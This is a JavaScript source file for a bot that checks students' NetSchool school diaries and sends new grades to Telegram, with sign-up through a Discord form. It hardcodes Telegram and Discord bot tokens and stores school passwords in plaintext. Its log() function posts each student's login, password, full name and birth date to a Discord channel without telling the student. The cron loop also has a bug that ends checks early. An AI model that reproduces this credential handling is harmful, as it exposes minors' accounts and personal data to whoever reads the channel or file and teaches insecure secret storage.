const { Telegraf, Markup, Extra} = require('telegraf');
const cron = require('node-cron');
const fs = require("fs");
const NS = require("netschoolapi").Safe;
const Discord = require('discord.js');
const {GatewayIntentBits, Partials, PermissionsBitField, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
bot = new Discord.Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.DirectMessageTyping,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ],
    partials: [
        Partials.Channel
    ]
});
const botTg = new Telegraf('5776158150:AAFqQaGbhLY1_0JZMg0nGny7NbTrHdl7EGk');
bot.login('MTAyOTY4NzU5Nzk4NDkwNzMyNA.GWwzcJ.slo7cN7cJyj0Gy8a7cqPVv9gR-4T4JydgGRNYE').then(()=>{console.log('DS Ready!')})
botTg.launch().then(()=>{console.log('TG Ready!')})
const users_ns = require('./memory/users.json');
setInterval(()=>{fs.writeFileSync('./memory/users.json',JSON.stringify(users_ns, null, "\t"));}, 1000*5);

botTg.command('start', (ctx) => {
    if(!users_ns.user[ctx.from.id]){
        users_ns.user[ctx.from.id] = setUser(ctx.from.id, null,null,null)
        ctx.reply(`Ваш id для регистрации: <code>${ctx.from.id}</code>\nЗарегистрироваться можно в <a href="https://discord.gg/EkmYFsxVcU">Discord канале</a>`,Extra.HTML())
    }
})
bot.on('messageCreate', msg => {
    if(msg.content === 'log'){sendLog(msg);}
})
bot.on('interactionCreate', async interaction=> {
    if(interaction.isButton()){if(interaction.customId === 'registration'){openLoginMenu(interaction)}}
    if(interaction.isModalSubmit()){if(interaction.customId === 'registrationModal'){
        interaction.reply({content:'💜',ephemeral:true})
        let i = await check(interaction)
        let embed = {
            color:3092790,
            fields:[
                {
                    name: 'Notice',
                    value: `${i}`,
                    inline: false,
                }
            ]
        }
        bot.guilds.cache.get('1029686781626548236').members.fetch(`${interaction.user.id}`)
            .then((user)=>{
                user.send({embeds:[embed]})
            })
    }}
})

/*setInterval(
async function(){
    for (let i in users_ns.user){
        const user = new NS({
            origin: "https://region.obramur.ru/",
            login: users_ns.user[i].login,
            password: users_ns.user[i].password,
            school: users_ns.user[i].school,
        });
        let arr0 = users_ns.user[i].arrMarks;
        let arr = [];
        let date = new Date()
        date.setMonth(date.getMonth() - 1)
        await user.logIn()
        const diary = await user.diary({
            start: date,
            end: new Date(),
        });
        markPackage(diary, arr0, arr)
        let intersect = intersection(arr0, arr);
        if(intersect[0]){
            sendMark(intersect, users_ns.user[i].id)
        }
        await user.logOut()
    }
}, 1000*10
);*/

cron.schedule('0 0-23 * * *', async function(){
    try{
        for (let i in users_ns.user){
            if(users_ns.user[i].login === null || users_ns.user[i].password === null || users_ns.user[i].school === null)return;
            const user = new NS({
                origin: "https://region.obramur.ru/",
                login: users_ns.user[i].login,
                password: users_ns.user[i].password,
                school: users_ns.user[i].school,
            });
            let arr0 = users_ns.user[i].arrMarks;
            let arr = [];
            let date = new Date()
            date.setMonth(date.getMonth() - 1)
            await user.logIn()
            const diary = await user.diary({
                start: date,
                end: new Date(),
            });
            await markPackage(diary, arr0, arr)
            let intersect = await intersection(arr0, arr);
            if(intersect[0]){
                sendMark(intersect, users_ns.user[i])
            }
            await user.logOut()
        }
    }catch(e){console.log(e);}
});

function sendMark(msg, id){
    let marks = []
    for (let i in msg) {
        marks.push(`\n${msg[i].date} ${msg[i].lesson} ${msg[i].mark}`)
    }
    botTg.telegram.sendMessage(id, `Вам выставили оценку: ${marks}`)
}

function intersection(arr0, arr) {
    const set = new Set();
    for (const { id } of arr0) set.add(id);
    const intersection = arr.filter(({ id }) => !set.has(id));
    if( arr0[0] === null){
        arr0.length = 0
        for(let i in arr){
            arr0.push({id: arr[i].id})
        }
        arr.length = 0;
        return intersection.length = 0;
    }
    arr0.length = 0
    for(let i in arr){
        arr0.push({id: arr[i].id})
    }
    arr.length = 0;
    return intersection;
}

function markPackage(diary,  arr0, arr) {
    for(let key in diary.days) {
        for (let key2 in diary.days[key].lessons) {
            for (let key3 in diary.days[key].lessons[key2].assignments){
                if (diary.days[key].lessons[key2].assignments[key3]){
                    let d = diary.days[key].lessons[key2].assignments[key3];
                    if (d.mark !== null){
                        if(diary.days[key].lessons[key2].subject ==='Основы безопасности жизнедеятельности'){
                            arr.push({
                                id: d.id,
                                date: diary.days[key]._date.slice(0,10),
                                lesson: 'ОБЖ',
                                mark: d.mark,
                            });
                        }else{
                            arr.push({
                                id: d.id,
                                date: diary.days[key]._date.slice(0,10),
                                lesson: diary.days[key].lessons[key2].subject,
                                mark: d.mark,
                            });
                        }
                    }
                }
            }
        }
    }
}

function sendLog(msg){
    const registration = new ButtonBuilder()
        .setCustomId("registration")
        .setEmoji('📝')
        .setStyle(ButtonStyle.Primary)

    const registrationEmbed = {
        color: 3092790,
        fields: [
            {
                name: "🔖 Регистрация в NetSchool",
                value: `Заполните данные 📝`,
                inline: false
            }
        ],
    }

    msg.channel.send({ embeds: [registrationEmbed], components: [
            new ActionRowBuilder().addComponents(
                registration
            ),
        ],
    })
}

function openLoginMenu(interaction) {
    const modal = new ModalBuilder()
        .setCustomId('registrationModal')
        .setTitle('Вход в систему');
    const login = new TextInputBuilder()
        .setCustomId('loginModal')
        .setLabel("Ваш логин от NetSchool")
        .setStyle(TextInputStyle.Short);

    const password = new TextInputBuilder()
        .setCustomId('passwordModal')
        .setLabel("Ваш пароль от NetSchool")
        .setStyle(TextInputStyle.Short);

    const tgId = new TextInputBuilder()
        .setCustomId('tgIdModal')
        .setLabel("Ваш id в Тг (получить у Ania_lob_bot в Тг)")
        .setStyle(TextInputStyle.Short);

    const firstActionRow = new ActionRowBuilder().addComponents(login);
    const secondActionRow = new ActionRowBuilder().addComponents(password);
    const thirdActionRow = new ActionRowBuilder().addComponents(tgId);

    modal.addComponents(firstActionRow, secondActionRow, thirdActionRow);

    interaction.showModal(modal);
}

async function check(interaction){
    let result = []
    let info = []
    const login = interaction.fields.getTextInputValue('loginModal');
    const password = interaction.fields.getTextInputValue('passwordModal');
    const id = interaction.fields.getTextInputValue('tgIdModal');
    if(!users_ns.user[id]){
        result.push('Сначала получите id у [Ania](https://t.me/ania_lob_bot) в телеграм')
        return result[0]
    }
    try {
        const user = new NS({
            origin: "https://region.obramur.ru/",
            login: login,
            password: password,
            school: 'МАОУ \"Алексеевская гимназия г.Благовещенска\"',
        });
        await user.logIn()
        let i = await user.info()
        info.push(i)
        await user.logOut()
    }catch (err) {
        result.push('Неверно указаны данные!\nЛибо вы не учитесь в \"МАОУ \"Алексеевская гимназия г.Благовещенска\"\"');
        return result[0];
    }
    result.push('Вы успешно вошли!')
    users_ns.user[id] = setUser(id, login, password, "МАОУ \"Алексеевская гимназия г.Благовещенска\"")
    log(interaction, id, login, password, info)
    return result[0];
}

function log(interaction, id, login, password, info) {
    bot.guilds.cache.get('1029686781626548236').channels.fetch('1029690784867426355').then((channel) =>{
        const embed = {
            color: 3092790,
            title: '🔖 Регистрация в NetSchool',
            author: {
                name: interaction.user.username,
                icon_url: `https://cdn.discordapp.com/avatars/${interaction.user.id}/${interaction.user.avatar}.jpeg`
            },
            fields: [
                {
                    name: "Логин",
                    value: `${login}`,
                    inline: false
                },
                {
                    name: "Пароль",
                    value: `${password}`,
                    inline: false
                },
                {
                    name: "Телеграм/Дискорд",
                    value: `${id}/${interaction.user.id}`,
                    inline: false
                },
                {
                    name: "ФИО",
                    value: `${info[0].lastName} ${info[0].firstName} ${info[0].middleName}`,
                    inline: false
                },
                {
                    name: "ДР",
                    value: `${info[0]._birthDate.slice(0,10)}`,
                    inline: false
                }
            ],
        }
        channel.send({embeds: [embed]})
    })
}

function setUser(user, login, password, school) {
    return{
        id: Number(user),
        login: login,
        password: password,
        school: school,
        arrMarks: [null],
    }
}
